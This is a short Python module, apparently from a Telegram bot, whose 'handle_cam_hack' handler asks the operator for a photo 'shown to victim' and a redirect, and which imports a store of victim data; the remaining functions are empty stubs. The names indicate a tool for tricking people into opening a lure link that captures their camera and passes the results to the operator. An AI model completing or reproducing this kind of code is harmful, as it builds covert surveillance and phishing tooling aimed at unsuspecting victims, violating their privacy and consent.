import uuid
import time
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.utils.storage import user_data, link_cache, victim_data_store

def handle_cam_hack(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    msg = bot.send_message(
        user_id,
        "📤 Send me a PHOTO (will be shown to victim)",
        reply_markup=get_bottom_buttons()
    )
    bot.register_next_step_handler(msg, get_cam_photo, user_id, get_bottom_buttons)

def get_cam_photo(message, user_id, get_bottom_buttons):
    # ... full code as before
    pass

def get_cam_redirect(message, user_id, get_bottom_buttons):
    # ... full code as before
    pass
